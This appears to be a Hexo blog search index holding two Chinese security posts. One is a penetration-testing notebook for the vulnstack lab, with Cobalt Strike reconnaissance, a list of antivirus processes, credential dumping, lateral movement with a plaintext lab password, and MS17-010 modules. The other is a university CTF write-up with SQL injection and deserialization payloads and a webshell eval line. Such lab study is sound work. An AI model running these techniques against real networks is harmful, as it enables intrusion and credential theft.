<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内网渗透学习</title>
      <link href="/2021/11/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/11/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="CS上线后对目标主机进行信息收集"><a href="#CS上线后对目标主机进行信息收集" class="headerlink" title="CS上线后对目标主机进行信息收集"></a>CS上线后对目标主机进行信息收集</h2><p><a href="https://soapffz.com/sec/558.html">ATT&amp;CK实战-红日安全vulnstack(一) - soapffz’s blog</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">hostname</span><br><span class="line">net user</span><br><span class="line">net localgroup administrator</span><br></pre></td></tr></table></figure><h3 id="查看是什么操作系统-amp-系统版本"><a href="#查看是什么操作系统-amp-系统版本" class="headerlink" title="查看是什么操作系统&amp;系统版本"></a>查看是什么操作系统&amp;系统版本</h3><p>系统中文：<code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code><br>系统英文：<code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code><br>查询系统体系架构：echo % PROCESSOR_ARCHITECTURE%</p><h3 id="查询已安装的软件及版本"><a href="#查询已安装的软件及版本" class="headerlink" title="查询已安装的软件及版本"></a>查询已安装的软件及版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><p>在 <code>win10</code> 中，输入 <code>wmic /?</code> 会提示 <code>wmic</code> 已弃用，但在 <code>server2012R2</code>，<code>win7</code> 等版本中可以正常使用</p><p><code>powershell</code> 中可替代该命令的是 <code>Get-WmiObject</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -class win32_product | Select-Object -property name,version</span><br></pre></td></tr></table></figure><h3 id="查询进程及服务"><a href="#查询进程及服务" class="headerlink" title="查询进程及服务"></a>查询进程及服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tasklist 默认显示映像名称，PID，会话名，会话，内存使用</span><br><span class="line">tasklist /svc，默认显示映像名称，PID，服务</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><p>常见的杀软进程：</p><table><thead><tr><th>进程名</th><th>软件</th></tr></thead><tbody><tr><td>360sd.exe</td><td>360 杀毒</td></tr><tr><td>360tray.exe</td><td>360 实时保护</td></tr><tr><td>ZhuDongFangYu.exe</td><td>360 主动防御</td></tr><tr><td>KSafeTray.exe</td><td>金山卫士</td></tr><tr><td>SafeDogUpdateCenter.exe</td><td>安全狗</td></tr><tr><td>McAfee</td><td>McShield.exe</td></tr><tr><td>egui.exe</td><td>NOD32</td></tr><tr><td>AVP.exe</td><td>卡巴斯基</td></tr><tr><td>avguard.exe</td><td>小红伞</td></tr><tr><td>bdagent.exe</td><td>BitDefender</td></tr></tbody></table><h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all 查看DNS服务器</span><br><span class="line">net view 查看域信息</span><br><span class="line">net view /domain 查看主域信息</span><br></pre></td></tr></table></figure><h3 id="查看时间服务器"><a href="#查看时间服务器" class="headerlink" title="查看时间服务器"></a>查看时间服务器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p>发现能够执行，说明此台机器在域中 (若是此命令在显示域处显示 WORKGROUP，则不存在域，若是报错：发生系统错误 5，则存在域，但该用户不是域用户)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询当前的登录域与用户信息：net config workstation</span><br></pre></td></tr></table></figure><h3 id="查找域控"><a href="#查找域控" class="headerlink" title="查找域控"></a>查找域控</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup + 域名 </span><br></pre></td></tr></table></figure><h3 id="查询域控和用户信息"><a href="#查询域控和用户信息" class="headerlink" title="查询域控和用户信息"></a>查询域控和用户信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net user /domain 查看当前域的所有用户</span><br><span class="line">wmic useraccount get /all 获取域内用户的详细信息</span><br><span class="line">net group &quot;domain computers&quot; /domain 查看所有域成员计算机列表</span><br><span class="line">net group &quot;domain admins&quot; /domain 查看域管理员</span><br><span class="line">net group &quot;domain controllers&quot; /domain 查看域控制器</span><br><span class="line">net group &quot;enterprise admins&quot; /domain 查看企业管理组</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看域控，升级为域控时，本地账户也成为域管：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators /domain</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取域密码信息：net accounts /domain</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取域信任信息 (cs 里执行提示不是内部或外部命令)：nltest /domain_trusts</span><br></pre></td></tr></table></figure><p>获取到一个 <code>cs</code> 的 <code>beacon</code> 后可以目标内网情况和端口开放情况</p><p>在 <code>beacon</code> 上右键 -&gt; 目标 -&gt; 选择 <code>net view</code> 或者 <code>port scan</code>:</p><p>选择前者执行：</p><p>用 <code>cs</code> 的 <code>hashdump</code> 读内存密码：<code>hashdump</code>，用 <code>mimikatz</code> 读注册表密码：<code>logonpasswords</code></p><p>在凭证信息一栏可以清楚查看：</p><p>如果权限不够可以提权，提权插件：<a href="https://github.com/rsmudge/ElevateKit">ElevateKit</a></p><p>额外增加 <code>ms14-058</code>、<code>ms15-051</code>、<code>ms16-016</code>、<code>uac-schtasks</code> 四种提权方式</p><p>抓取密码后可以先探测内网其他主机：</p><p><code>ping</code> 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.72.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure><p>最简单的直接 <code>arp -a</code> 查看也可以，这里还推荐一个好用工具 <code>Ladon</code></p><p><a href="https://github.com/k8gege/Ladon"><code>Ladon</code></a>作者是 <code>k8gege</code>，它是一个大型内网渗透扫描器并且支持 <code>cs</code> 脚本形式</p><p><code>cs</code> 要使用的话只需要下载其中的 <code>Ladon.exe</code> 和 <code>Ladon.cna</code> 即可运行基本功能</p><p>详细功能参考官方 <a href="https://github.com/k8gege/Ladon/wiki"><code>wiki</code></a>或<a href="http://k8gege.org/p/648af4b3.html">官方说明文档</a></p><p>查看帮助：</p><p>扫描网段内存活主机信息：<code>Ladon 192.168.72.0/24 OsScan</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon` 还有很多使用功能，比如扫描 `MS17-010`：`Ladon 192.168.72.0/24 MS17010</span><br></pre></td></tr></table></figure><p>其他的功能可以自己去尝试</p><p>域探测差不多了还可以使用 <a href="https://github.com/BloodHoundAD/BloodHound"><code>BloodHound</code></a>这款域渗透分析工具来分析攻击路径</p><p>BloodHound 介绍：</p><blockquote><p>BloodHound 是一种单页的 JavaScript 的 Web 应用程序，构建在 Linkurious 上，用 Electron 编译，NEO4J 数据库 PowerShell/C# ingestor.BloodHound 使用可视化图来显示 Active Directory 环境中隐藏的和相关联的主机内容。攻击者可以使用 BloodHound 轻松识别高度复杂的攻击路径，否则很难快速识别。防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入了解 Active Directory 环境中的权限关系。</p></blockquote><h2 id="横向移动展开目录"><a href="#横向移动展开目录" class="headerlink" title="横向移动展开目录"></a>横向移动展开目录</h2><p>这里有很多种方式，可以：</p><ol><li>cs 上开通 socks 通道，在攻击机上用 proxychains 将攻击机的 msf 代入内网，但是 cs 的 socks 代理不稳定</li><li>ew 添加转接隧道，在攻击机上用 proxychains 将攻击机的 msf 代入内网</li><li>cs 派生到 msf，msf 使用 socks4a 代理进内网，但是并不稳定</li><li>cs 派生到 msf，msf 使用使用 autoroute 添加路由进内网</li><li>用 frp 创建 socks5 代理</li></ol><p>我后面会专门写一篇文章来写各种带入方式，本篇篇幅过长，就不全部使用了</p><h3 id="SMB-Beacon展开目录"><a href="#SMB-Beacon展开目录" class="headerlink" title="SMB Beacon展开目录"></a>SMB Beacon展开目录</h3><p>另外这里还要介绍下 <code>cs</code> 派生 <code>SMB Beacon</code></p><blockquote><p>SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效</p></blockquote><p>简单来说，SMB Beacon 有两种方式</p><p>第一种直接派生一个孩子，目的为了进一步盗取内网主机的 hash</p><p>新建一个 <code>Listener</code>，<code>payload</code> 设置为 <code>Beacon SMB</code>：</p><p>在已有的 <code>Beacon上</code>右键 <code>Spawn</code>(生成会话 / 派生)，选择创建的 <code>smb beacon</code> 的 <code>listerner</code>:</p><p>选择后会反弹一个子会话，在 <code>external</code> 的 <code>ip</code> 后面会有一个链接的小图标：</p><p>在图标视图中：</p><p>这就是派生的 <code>SMB Beacon</code>，当前没有连接</p><p>可以在主 <code>Beacon</code> 上用 <code>link host</code> 连接它，或者 unlink host 断开它</p><h3 id="psexec-使用凭证登录其他主机展开目录"><a href="#psexec-使用凭证登录其他主机展开目录" class="headerlink" title="psexec 使用凭证登录其他主机展开目录"></a>psexec 使用凭证登录其他主机展开目录</h3><p>前面横向探测已经获取到内网内的其他 <code>Targets</code> 以及读取到的凭证信息</p><p>于是可以尝试使用 <code>psexec</code> 模块登录其他主机</p><p>右键选择一台非域控主机 <code>ROOT-TVI862UBEH</code> 的 <code>psexec</code> 模块：</p><p>在弹出的窗口中选择使用 <code>god.org</code> 的 <code>Administrator</code> 的凭证信息</p><p>监听器选择刚才创建的 <code>smb beacon</code>，会话也选择对应的 <code>smb beacon</code> 的会话：</p><p>可以看到分别执行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rev2self</span><br><span class="line">make_token GOD.ORG\Administrator hongrisec@2020</span><br><span class="line">jump psexec ROOT-TVI862UBEH smb</span><br></pre></td></tr></table></figure><p>这几条命令，执行后得到了 <code>ROOT-TVI862UBEH</code> 这台主机的 <code>beacon</code></p><p>如法炮制得到了域控主机 <code>OWA</code> 的 <code>beacon</code>:</p><h3 id="token-窃取展开目录"><a href="#token-窃取展开目录" class="headerlink" title="token 窃取展开目录"></a>token 窃取展开目录</h3><p>除了直接使用获取到的 <code>hash</code> 值，也可以直接窃取 <code>GOD\Administrator</code> 的 <code>token</code> 来登录其他主机</p><p>选择 <code>beacon</code> 右键 -&gt; 目标 -&gt; 进程列表</p><p>选择 <code>GOD\Administrator</code> 的 <code>token</code> 盗取：</p><p>然后在选择令牌处勾选使用当前 <code>token</code> 即可：</p><p>效果和前面是一样的</p><h3 id="cs-派生-msf-横向移动展开目录"><a href="#cs-派生-msf-横向移动展开目录" class="headerlink" title="cs 派生 msf 横向移动展开目录"></a>cs 派生 msf 横向移动展开目录</h3><p>前面 <code>psexec</code> 能迅速地获得域控主机的 <code>beacon</code> 是因为我们读取到了域管理员账号密码的 <code>hash</code></p><p>但是一般情况下，我们是获取不到的，所以多种方法都需要学会使用</p><p><code>cs</code> 和 <code>msf</code> 联动的话，可以使用 <code>cs</code> 开启 <code>socks</code>，然后 <code>msf</code> 将代理设置为此代理进行扫描</p><p>也可以直接用 <code>cs</code> 派生一个 <code>msf</code> 的 <code>meterpreter</code> 会话，此处使用后者</p><p><code>cs</code> 与 <code>msf</code> 联动在 <code>cs</code> 的使用这篇文章中已经介绍过，此处不再赘述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf` 获得 `meterpreter` 会话后，首先查看当前路由：`run get_local_subnets</span><br></pre></td></tr></table></figure><p>然后添加对应网段：<code>run autoroute -s 192.168.72.0/24</code> 添加路由段</p><p>然后去使用 <code>ms17-010</code> 的模块，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/smb/ms17010command</span><br><span class="line">exploit/windows/smb/ms17010psexec</span><br></pre></td></tr></table></figure><p>等去攻击域内其他主机即可。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>广西大学第一届 &quot;网络安全宣传周&quot; 信息安全实践赛wp</title>
      <link href="/2021/11/14/%E6%A0%A1%E8%B5%9Bwp/"/>
      <url>/2021/11/14/%E6%A0%A1%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="广西大学第一届-“网络安全宣传周”-信息安全实践赛wp"><a href="#广西大学第一届-“网络安全宣传周”-信息安全实践赛wp" class="headerlink" title="广西大学第一届 “网络安全宣传周” 信息安全实践赛wp"></a>广西大学第一届 “网络安全宣传周” 信息安全实践赛wp</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="baby-网站目录"><a href="#baby-网站目录" class="headerlink" title="baby_网站目录"></a>baby_网站目录</h3><p>f12 访问</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022185535525.png" alt="image-20211022185535525" loading="lazy"></p><h3 id="baby-request"><a href="#baby-request" class="headerlink" title="baby_request"></a>baby_request</h3><p>get和post </p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022185802236.png" alt="image-20211022185802236" loading="lazy"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.194.57:3702/request/?text1=yesyesyes&amp;text2=goodgoodgood</span><br><span class="line"></span><br><span class="line">text3=wellwellwell&amp;text4=nicenicenice</span><br></pre></td></tr></table></figure><h3 id="baby-前端"><a href="#baby-前端" class="headerlink" title="baby_前端"></a>baby_前端</h3><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022185843985.png" alt="image-20211022185843985" loading="lazy"></p><p>jsfuck 放控制台里跑一下就有了</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022190135736.png" alt="image-20211022190135736" loading="lazy"></p><h3 id="baby-预防虫虫！"><a href="#baby-预防虫虫！" class="headerlink" title="baby_预防虫虫！"></a>baby_预防虫虫！</h3><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022190222656.png" alt="image-20211022190222656" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022190344846.png" alt="image-20211022190344846" loading="lazy"></p><h3 id="五子棋"><a href="#五子棋" class="headerlink" title="五子棋"></a>五子棋</h3><p>ban掉js 在/js/script里找flag</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022190451764.png" alt="image-20211022190451764" loading="lazy"></p><h3 id="baby-快来猜大小"><a href="#baby-快来猜大小" class="headerlink" title="baby_快来猜大小"></a>baby_快来猜大小</h3><p>嗯点</p><h3 id="baby-注入"><a href="#baby-注入" class="headerlink" title="baby_注入"></a>baby_注入</h3><p>无过滤 直接sqlmap跑</p><h3 id="ez-快来猜拳啊"><a href="#ez-快来猜拳啊" class="headerlink" title="ez_快来猜拳啊"></a>ez_快来猜拳啊</h3><p>cookie里的count值用来计数且固定 所以直接写脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># coding=gbk</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url=&quot;http://120.24.194.57:3703/the_finger_guessing_game/index.php?b=quan&quot;</span><br><span class="line">session = requests.session();</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    payload = &quot;Y2ZjZDIwODQ5NWQ1NjVlZjY2ZTdkZmY5Zjk4NzY0ZGE%3D&quot;</span><br><span class="line">    flags = &quot;&quot;</span><br><span class="line">    while True:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            &quot;Host&quot;: &quot;120.24.194.57:3703&quot;,</span><br><span class="line">            &quot;Pragma&quot;: &quot;no-cache&quot;,</span><br><span class="line">            &quot;Cache-Control&quot;: &quot;no-cache&quot;,</span><br><span class="line">            &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50&quot;,</span><br><span class="line">            &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;,</span><br><span class="line">            &quot;Referer&quot;: &quot;http://120.24.194.57:3703/the_finger_guessing_game/index.php?b=quan&quot;,</span><br><span class="line">            &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">            &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;,</span><br><span class="line">            &quot;Cookie&quot;: &quot;count=&#123;0&#125;; welcomebanner_status=dismiss; cookieconsent_status=dismiss; language=en; continueCode=LRDPV4rmB3pze58njKXq9NdErHjTRi2MuZ3slNGQMgZ2wbvJalY6O1y7xoEW; PHPSESSID=8pa8oeu0hj8s4q79s1brd83st4&quot;.format(</span><br><span class="line">                payload)</span><br><span class="line">        &#125;</span><br><span class="line">        response=session.get(url=url,headers=headers)</span><br><span class="line">        if &quot;下面是你的flag：&quot; in response.text:</span><br><span class="line">            flags+=re.search(&quot;下面是你的flag：(.)&quot;,response.text).group(1)</span><br><span class="line">            print (flags)</span><br><span class="line">            payload = response.cookies.get(&quot;count&quot;)</span><br><span class="line">        #print(session.get(url=url,headers=headers).text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp();</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022191113442.png" alt="image-20211022191113442" loading="lazy"></p><h3 id="ez-不能说的秘密"><a href="#ez-不能说的秘密" class="headerlink" title="ez_不能说的秘密"></a>ez_不能说的秘密</h3><p>payload:</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022192505296.png" alt="image-20211022192505296" loading="lazy"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">class a&#123;</span><br><span class="line">    public $usernmae = &quot;admin&quot;;</span><br><span class="line">    public $do_u_want_flag=&quot;yes! yes! yse!&quot;;</span><br><span class="line">    public $youwant=&quot;flag2&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new a());</span><br></pre></td></tr></table></figure><p>变量覆盖直接post secret</p><p>绕过直接ban掉js</p><h3 id="ez-猜猜我是谁"><a href="#ez-猜猜我是谁" class="headerlink" title="ez_猜猜我是谁"></a>ez_猜猜我是谁</h3><p>原题应该是某一年国赛的just soso </p><p>这里用到反序列化的引用类型</p><p>大小写绕过正则即可</p><p>payload:</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022193643880.png" alt="image-20211022193643880" loading="lazy"></p><h3 id="ez-web"><a href="#ez-web" class="headerlink" title="ez_web"></a>ez_web</h3><p>观察url 考虑base64</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022193720679.png" alt="image-20211022193720679" loading="lazy"></p><p>MmUyZjZjNmY2NzZmMmU3MDZlNjc=</p><p>再考虑base64</p><p>2e2f6c6f676f2e706e67</p><p>考虑十六进制串解码</p><p>./logo.png</p><p>则考虑按规律改变文件名进行文件读取</p><p>读取./index.php</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022193915693.png" alt="image-20211022193915693" loading="lazy"></p><p>base64解码</p><p>得</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022193939504.png" alt="image-20211022193939504" loading="lazy"></p><h3 id="easy-web2-0"><a href="#easy-web2-0" class="headerlink" title="easy_web2.0"></a>easy_web2.0</h3><p>依然考虑easy_web的文件构造方式，发现成功解码出tmp.jpg</p><p>考虑读取./index.php</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022194104038.png" alt="image-20211022194104038" loading="lazy"></p><p>此处设置了open_basedir 意味着此题的所有文件大概都在这个目录下</p><p>在没有任何下一步的提示下（我做出时还没放hint）</p><p>考虑扫目录</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211019140101751.png" alt="image-20211019140101751" loading="lazy"></p><p>加入.php的后缀 扫出web.php</p><p>利用第一步的文件读取读取出web.php</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022194510863.png" alt="image-20211022194510863" loading="lazy"></p><p>考点为弱比较和md5对数组使用的特性和伪协议</p><p>绕过兼满足条件payload</p><p>one[]=1&amp;two[]=2&amp;file=data://text/plain,welcome!&amp;temp=O:4:”File”:1:{s:3:”dir”;s:9:”240610708”;}</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022194855247.png" alt="image-20211022194855247" loading="lazy"></p><p>用第一步的文件读取读取</p><p>flag_md(8ef52dea328bde9315cc15eb6b770519).php</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022194938166.png" alt="image-20211022194938166" loading="lazy"></p><p>base64解码得</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022195000362.png" alt="image-20211022195000362" loading="lazy"></p><h3 id="SSSSSSSQL"><a href="#SSSSSSSQL" class="headerlink" title="SSSSSSSQL"></a>SSSSSSSQL</h3><p>试密码试出7777</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022195105928.png" alt="image-20211022195105928" loading="lazy"></p><p>找了很久的注入点，一开始一直在登录界面和这个搜索框尝试注入，但一直没有结果。</p><p>后来发现这个页面中只有“查看”这个按钮是有功能性的，试图在前端用检查元素找出接口，但无法找到</p><p>只好翻前端的js</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022195510457.png" alt="image-20211022195510457" loading="lazy"></p><p>审查到有77777777.php，传参为page和id</p><p>进去看看</p><p>先在page堆叠注，发现过滤了很多东西，fuzz一下发现几乎过滤所有东西，应该不是在这块地方注</p><p>在id堆叠注，发现<img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022195843677.png" alt="image-20211022195843677" loading="lazy"></p><p>成功注出</p><p>则依次show databases;use linkflag;show tables;</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022195929811.png" alt="image-20211022195929811" loading="lazy"></p><p>show columns from ffffffflags</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022200010054.png" alt="image-20211022200010054" loading="lazy"></p><p>找到f1a9</p><p>接下来强网杯随便注的payload来打，发现rename和alter都ban了</p><p>只剩预处理了</p><p>直接拿payload打</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022200610042.png" alt="image-20211022200610042" loading="lazy"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.194.57:3703/SSSSSSSQL/77777777.php?id=1&#x27;;show databases;use linkflag;show tables;show columns from ffffffflags;seT @sql = CONCAT(&#x27;se&#x27;,&#x27;lect f1a9 from ffffffflags;&#x27;);Prepare stmt from @sql;EXEcUTE stmt;#</span><br></pre></td></tr></table></figure><h3 id="ez-反序列化"><a href="#ez-反序列化" class="headerlink" title="ez_反序列化"></a>ez_反序列化</h3><p>题目提示反序列化 考虑phar</p><p>因为满足phar三要素 可控上传 必需符号没ban 有读取文件的函数</p><p>先读./read.php</p><p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211022200753291.png" alt="image-20211022200753291" loading="lazy"></p><p>发现class.php</p><p>读class.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/bbunser/&#x27;);</span><br><span class="line"></span><br><span class="line">class aa&#123;</span><br><span class="line">    public $name;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;name=&#x27;aa&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;name=strtolower($this-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ff&#123;</span><br><span class="line">    private $content;</span><br><span class="line">    public $func;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;content=&quot;\&lt;?php @eval(\$_POST[1]);?&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span 